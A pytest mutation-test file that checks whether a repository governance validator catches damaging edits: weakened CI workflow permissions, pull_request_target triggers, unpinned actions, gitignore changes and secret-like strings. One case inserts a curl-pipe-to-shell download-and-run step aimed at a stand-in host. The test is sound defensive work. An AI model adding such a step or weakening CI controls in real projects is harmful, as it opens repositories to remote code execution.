"""The governance validator must catch what it claims to catch (mutation guard for TASK-01 controls).

Each case damages a scratch copy of the repository in one way and expects the validator to fail;
two harmless look-alikes must still pass. The scratch copy is reset between cases.
"""

from __future__ import annotations

import pathlib
import re
import shutil
import subprocess
import sys
from collections.abc import Callable

import pytest

ROOT = pathlib.Path(__file__).resolve().parents[2]
GIT = ["git", "-c", "user.name=t", "-c", "user.email=t@example.invalid"]
WF = ".github/workflows/governance-ci.yml"
PR = ".github/pull_request_template.md"
POL = "docs/governance/repository-policy.md"
WI = ".github/ISSUE_TEMPLATE/work-item.md"
SPEC_COMMIT = "5d1cd410399a6fb0154a0117728c409cc7f2ec91"
Mutation = Callable[[pathlib.Path], None]


def run(cmd: list[str], cwd: pathlib.Path) -> subprocess.CompletedProcess[str]:
    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True, check=False)


def edit(root: pathlib.Path, rel: str, fn: Callable[[str], str]) -> None:
    path = root / rel
    path.write_text(
        fn(path.read_text(encoding="utf-8")), encoding="utf-8", newline="\n"
    )
    run(["git", "add", "-A"], root)


def write(root: pathlib.Path, rel: str, data: str | bytes) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, bytes):
        path.write_bytes(data)
    else:
        path.write_text(data, encoding="utf-8", newline="\n")
    run(["git", "add", "-A"], root)


def replace(rel: str, old: str, new: str) -> Mutation:
    return lambda root: edit(root, rel, lambda text: text.replace(old, new, 1))


MUTATIONS: dict[str, Mutation] = {
    "policy loses force-push wording": replace(POL, "force-push", "fp"),
    "policy loses severity section": replace(
        POL, "## Findings and severity", "## Findings"
    ),
    "policy loses self-approval rule": replace(
        POL, "self-approval is prohibited", "approval is optional"
    ),
    "policy Specs SHA changed": replace(POL, SPEC_COMMIT, "0" * 40),
    "PR template loses Full gates field": replace(PR, "- Full gates:\n", ""),
    "PR template loses non-claims field": replace(PR, "- Explicit non-claims:\n", ""),
    "PR template Ponytail line loses ponytail-review": replace(
        PR, "`ponytail-review`", "review"
    ),
    "PR template replaced by x": lambda root: write(root, PR, "x\n"),
    "issue template replaced by x": lambda root: write(root, WI, "x\n"),
    "work-item template loses Next safe action": replace(
        WI, "- Next safe action:", "- Next:"
    ),
    "workflow contents: write": replace(WF, "contents: read", "contents: write"),
    "workflow comment hides write": replace(
        WF, "  contents: read", "  contents: write # contents: read"
    ),
    "workflow pull_request_target": replace(
        WF, "pull_request:", "pull_request_target:"
    ),
    "workflow validator step commented out": replace(
        WF,
        "run: python3 scripts/validate_governance.py",
        "run: echo # python3 scripts/validate_governance.py",
    ),
    "workflow unpinned action": lambda root: edit(
        root,
        WF,
        lambda text: re.sub(
            r"(uses: actions/checkout@)[0-9a-f]{40}", r"\1v5", text, count=1
        ),
    ),
    "workflow continue-on-error": replace(
        WF, "timeout-minutes: 5", "timeout-minutes: 5\n    continue-on-error: true"
    ),
    "gitignore loses *.pem": replace(".gitignore", "*.pem\n", ""),
    "gitignore .env commented": replace(".gitignore", "\n.env\n", "\n# .env\n"),
    "gitignore loses *.sqlite": replace(".gitignore", "*.sqlite\n", ""),
    "gitignore only a comment": lambda root: write(
        root, ".gitignore", "# .env .env.* *.pem evidence/private/\n"
    ),
    "valid-looking card number in markdown": lambda root: write(
        root, "docs/leak.md", "card " + "4111" + "1111" + "1111" + "1111" + " here\n"
    ),
    "NUL byte in text file": lambda root: write(root, "docs/nul.txt", b"abc\x00def\n"),
    "invalid work-item status": lambda root: edit(
        root,
        "docs/work-items/TASK-01.md",
        lambda text: re.sub(
            r"(?m)^\*\*Status:\*\*.*$", "**Status:** out of scope", text, count=1
        ),
    ),
    "GitHub token in markdown": lambda root: write(
        root, "docs/t.md", "token ghp_" + "a" * 36 + "\n"
    ),
    "placeholder marker": lambda root: write(root, "docs/p.md", "T" + "BD later\n"),
    "binary file": lambda root: write(root, "blob.bin", b"\x89PNG\x00\x01"),
}
HARMLESS: dict[str, Mutation] = {
    "non-Luhn 16-digit number is not flagged": lambda root: write(
        root, "docs/n.md", "id 1234567890123456 here\n"
    ),
    "CI run id (11 digits) is not flagged": lambda root: write(
        root, "docs/n2.md", "run 37957596129 ok\n"
    ),
    "13-digit millisecond timestamp is not flagged": lambda root: write(
        root, "docs/n3.md", "at 1760000000000 ms\n"
    ),
    "hyphenated prose after Bearer is not flagged": lambda root: write(
        root, "docs/n4.md", "Bearer authentication-scheme-description follows\n"
    ),
    ".env.example stays trackable and not ignored": lambda root: write(
        root, "docs/n5.md", "see .env.example\n"
    ),
}

# Cases from the independent re-verification of the first hardening: the previous checks passed all
# of these. The workflow is protected by a whole-file digest, so every edit below must fail.
WORKFLOW_EDITS: dict[str, Mutation] = {
    "workflow gains an extra permission": replace(
        WF, "  contents: read\n", "  contents: read\n  issues: write\n"
    ),
    "workflow job-level write-all": replace(
        WF,
        "    runs-on: ubuntu-latest\n",
        "    runs-on: ubuntu-latest\n    permissions: write-all\n",
    ),
    "workflow step disabled by a condition": replace(
        WF,
        "        run: python3 scripts/validate_governance.py",
        "        if: false\n        run: python3 scripts/validate_governance.py",
    ),
    "workflow gains a download-and-run step": replace(
        WF,
        "        run: pytest -q",
        "        run: pytest -q\n      - run: curl https://example.invalid/x.sh | sh",
    ),
    "workflow action in flow style": replace(
        WF,
        "      - name: Check out exact revision\n        uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n",
        "      - {uses: actions/checkout@v5}\n",
    ),
    "workflow trigger changed to a branch that never exists": replace(
        WF, "    branches: [main]", "    branches: [nonexistent]"
    ),
    "workflow validator step moved out of its job": replace(
        WF,
        "      - name: Validate TASK-01 governance and repository safety\n        run: python3 scripts/validate_governance.py\n",
        "",
    ),
}
GITIGNORE_EDITS: dict[str, Mutation] = {
    "gitignore re-includes private keys": lambda root: edit(
        root, ".gitignore", lambda text: text + "!*.pem\n"
    ),
    "gitignore re-includes everything": lambda root: edit(
        root, ".gitignore", lambda text: text + "!*\n"
    ),
    "nested gitignore re-includes keys": lambda root: write(
        root, "src/.gitignore", "!*.pem\n"
    ),
    "gitignore pattern with leading spaces": lambda root: edit(
        root, ".gitignore", lambda text: text.replace("\n*.pem\n", "\n  *.pem\n", 1)
    ),
    "gitignore hides the example file the repo needs": lambda root: edit(
        root, ".gitignore", lambda text: text.replace("!.env.example\n", "", 1)
    ),
}
DOCUMENT_EDITS: dict[str, Mutation] = {
    "template field only inside an HTML comment": replace(
        PR, "- Full gates:\n", "<!-- - Full gates: -->\n"
    ),
    "template heading only inside an HTML comment": replace(
        PR, "## Merge checklist\n", "<!-- ## Merge checklist -->\n"
    ),
    "template field only inside a code fence": replace(
        PR, "- Full gates:\n", "```\n- Full gates:\n```\n"
    ),
    "policy heading moved into a comment": replace(
        POL, "## Findings and severity\n", "<!-- ## Findings and severity -->\n"
    ),
    "policy severity definition deleted": replace(
        POL,
        "- **Major:** required behavior, control, or evidence is missing or materially inconsistent.\n",
        "",
    ),
    "policy lifecycle row deleted": replace(
        POL,
        "| Verified | Required independent tests and gates passed against the named immutable revision. |\n",
        "",
    ),
    "policy single-maintainer statement removed": replace(
        POL, "single maintainer", "team of maintainers"
    ),
    "policy Cursor controls removed": lambda root: edit(
        root, POL, lambda text: text.replace("Cursor", "Editor")
    ),
    "work-item status duplicated": lambda root: edit(
        root,
        "docs/work-items/TASK-01.md",
        lambda text: text.replace(
            "**Status:** Implemented",
            "**Status:** Implemented\n**Status:** Verified",
            1,
        ),
    ),
    "work-item status unbolded": lambda root: edit(
        root,
        "docs/work-items/TASK-01.md",
        lambda text: text.replace("**Status:** Implemented", "Status: Implemented", 1),
    ),
    "work-item template GAP sentence weakened": replace(
        WI, "becomes GAP-nnnn and pauses", "becomes a note and may pause"
    ),
}
SECRET_FORMS: dict[str, Mutation] = {
    "card number written with spaces": lambda root: write(
        root,
        "docs/c1.md",
        "card " + " ".join(["4111", "1111", "1111", "1111"]) + " here\n",  # noqa: FLY002 (a literal here would trip the card scan)
    ),
    "card number written with dashes": lambda root: write(
        root,
        "docs/c2.md",
        "card " + "-".join(["4111", "1111", "1111", "1111"]) + " here\n",  # noqa: FLY002
    ),
    "bearer token with digits": lambda root: write(
        root, "docs/c3.md", "Authorization: Bear" + "er abcdefghij0123456789xyz\n"
    ),
}
MUTATIONS.update(WORKFLOW_EDITS | GITIGNORE_EDITS | DOCUMENT_EDITS | SECRET_FORMS)


@pytest.fixture(scope="module")
def scratch(tmp_path_factory: pytest.TempPathFactory) -> pathlib.Path:
    root = tmp_path_factory.mktemp("governance")
    listed = run(
        ["git", "ls-files", "-z", "--cached", "--others", "--exclude-standard"], ROOT
    )
    for rel in filter(None, listed.stdout.split(chr(0))):
        if rel == "CLAUDE.md":
            continue  # local, untracked, never part of the repository
        target = root / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        shutil.copyfile(ROOT / rel, target)
    run(["git", "init", "-q"], root)
    run(["git", "add", "-A"], root)
    run([*GIT, "commit", "-q", "-m", "baseline"], root)
    return root


@pytest.fixture
def clean(scratch: pathlib.Path) -> pathlib.Path:
    run(["git", "reset", "-q", "--hard"], scratch)
    run(["git", "clean", "-fdq"], scratch)
    return scratch


def validate(root: pathlib.Path) -> int:
    return run(
        [sys.executable, "-I", "scripts/validate_governance.py"], root
    ).returncode


def test_the_untouched_repository_passes(clean: pathlib.Path) -> None:
    assert validate(clean) == 0


@pytest.mark.parametrize("name", list(MUTATIONS))
def test_validator_catches(clean: pathlib.Path, name: str) -> None:
    MUTATIONS[name](clean)
    assert validate(clean) != 0, name


@pytest.mark.parametrize("name", list(HARMLESS))
def test_validator_does_not_flag_harmless_look_alikes(
    clean: pathlib.Path, name: str
) -> None:
    HARMLESS[name](clean)
    assert validate(clean) == 0, name
